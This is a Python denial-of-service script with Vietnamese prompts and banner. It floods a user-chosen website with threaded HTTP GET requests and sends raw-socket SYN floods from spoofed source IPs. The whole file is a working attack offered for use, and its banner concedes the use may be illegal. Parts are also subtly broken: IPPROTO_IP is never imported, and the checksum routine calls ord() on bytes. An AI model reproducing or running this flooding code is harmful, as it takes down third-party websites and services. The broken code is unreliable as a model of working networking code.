from platform import system
import os
import time
import random
import socket
from urllib import request
import sys
import threading
from requests import get as requests_get
from time import localtime, strftime
from struct import pack
from socket import AF_INET, SOCK_RAW, IPPROTO_TCP, IP_HDRINCL, inet_aton, htons
from random import randint
import colorama
from colorama import Fore, Back, Style
from tqdm.auto import tqdm

colorama.init()

def clearConsole():
    command = 'clear'
    if os.name in ('nt', 'dos'):
        command = 'cls'
    os.system(command)

def banner():
    clearConsole()
    print(Fore.RED + '''
         __     _____ ____   ___  ____ ____    ____ _____ _   _ ____ ___ ___  
 \ \   / /_ _| __ ) / _ \/ ___/ ___|  / ___|_   _| | | |  _ \_ _/ _ \ 
  \ \ / / | ||  _ \| | | \___ \___ \  \___ \ | | | | | | | | | | | | |
   \ V /  | || |_) | |_| |___) |__) |  ___) || | | |_| | |_| | | |_| |
    \_/  |___|____/ \___/|____/____/  |____/ |_|  \___/|____/___\___/ 
                                                                      

        -------------------------------------------------
           ----| DDoS Attack _ GitHub:@dhungx    |----   
        -------------------------------------------------
        ''' + Style.RESET_ALL + Fore.YELLOW + Style.BRIGHT +
        '''
        HÃY CẨN TRỌNG TRƯỚC KHI SỬ DỤNG VÌ VIỆC BẠN SẮP LÀM CÓ THỂ LÀ MỘT ĐIỀU PHẠM PHÁP
        ĐỪNG TẤN CÔNG TRANG WEB CHÍNH PHỦ (NHÀ NƯỚC)
        ''' + Style.RESET_ALL + Fore.MAGENTA + Style.BRIGHT + '''
        by: V I B O S S   S T U D I O
        ''' + Style.RESET_ALL)

def http_get_flood(target, packet_size):
    count = 0
    if packet_size == "u":
        print("===== Tấn công HTTP GET Flood bắt đầu :)")
        while True:
            named_tuple = localtime()
            time_string = strftime("%m/%d/%Y, %H:%M:%S", named_tuple)
            r = requests_get("http://" + target)
            print(f"[{time_string}] Gói tin đã gửi ({count})")
            count += 1
    elif int(packet_size) >= 1:
        print("===== Tấn công HTTP GET Flood bắt đầu :)")
        while count <= int(packet_size):
            named_tuple = localtime()
            time_string = strftime("%m/%d/%Y, %H:%M:%S", named_tuple)
            r = requests_get("http://" + target)
            print(f"[{time_string}] Gói tin đã gửi ({count})")
            count += 1
        print("HTTP GET Flood tấn công kết thúc!")
    else:
        print("Lỗi: Vui lòng nhập đúng số lượng gói tin.")
        print("Lưu ý: Chương trình sẽ tự động đóng sau 5 giây!")

def checksum(psh):
    s = 0
    for i in range(0, len(psh), 2):
        w = (ord(psh[i]) << 8) + ord(psh[i+1])
        s = s + w
    s = (s >> 16) + (s & 0xffff)
    s = ~s & 0xffff
    return s

def syn_flood(target_ip, fake_ip):
    sock = socket.socket(AF_INET, SOCK_RAW, IPPROTO_TCP)
    sock.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
    
    while True:
        source_ip = fake_ip
        dest_ip = target_ip
        ip_header = pack('!BBHHHBBH4s4s', 69, 0, 40, 54321, 0, 64, IPPROTO_TCP, 0, inet_aton(source_ip), inet_aton(dest_ip))

        tcp_header = pack('!HHLLBBHHH', 12345, 80, 0, 0, 5 << 4, 2, htons(5840), 0, 0)

        psh = pack('!4s4sBBH', inet_aton(source_ip), inet_aton(dest_ip), 0, IPPROTO_TCP, len(tcp_header))
        psh = psh + tcp_header

        tcp_checksum = checksum(psh)
        tcp_header = pack('!HHLLBBHHH', 12345, 80, 0, 0, 5 << 4, 2, htons(5840), tcp_checksum, 0)

        packet = ip_header + tcp_header
        sock.sendto(packet, (target_ip, 0))

def main():
    banner()
    
    target = input("-- Nhập URL mục tiêu: ")
    packet_size = input("-- Số lượng gói tin (\"u\" = không giới hạn): ")
    fake_ip = input("-- Nhập IP giả mạo (hoặc để trống để tự động tạo): ") or '.'.join([str(randint(0, 255)) for _ in range(4)])
    
    # Nhập số lượng luồng cho mỗi loại tấn công
    http_threads_count = int(input("-- Số lượng luồng HTTP GET Flood: "))
    syn_threads_count = int(input("-- Số lượng luồng SYN Flood: "))
    
    if target.startswith("http://"):
        target = target[7:]
    elif target.startswith("https://"):
        target = target[8:]
    
    # Kiểm tra mục tiêu
    try:
        requests_get("http://" + target)
    except:
        print("Lỗi: Địa chỉ trang web không hợp lệ.")
        return
    
    # Bắt đầu các cuộc tấn công HTTP GET Flood và SYN Flood với số lượng luồng đã chỉ định
    http_threads = []
    for _ in range(http_threads_count):
        http_thread = threading.Thread(target=http_get_flood, args=(target, packet_size))
        http_thread.start()
        http_threads.append(http_thread)
    
    syn_threads = []
    for _ in range(syn_threads_count):
        syn_thread = threading.Thread(target=syn_flood, args=(target, fake_ip))
        syn_thread.start()
        syn_threads.append(syn_thread)
    
    # Optionally join threads if you want the main program to wait for them to finish
    for thread in http_threads:
        thread.join()
    for thread in syn_threads:
        thread.join()

if __name__ == "__main__":
    main()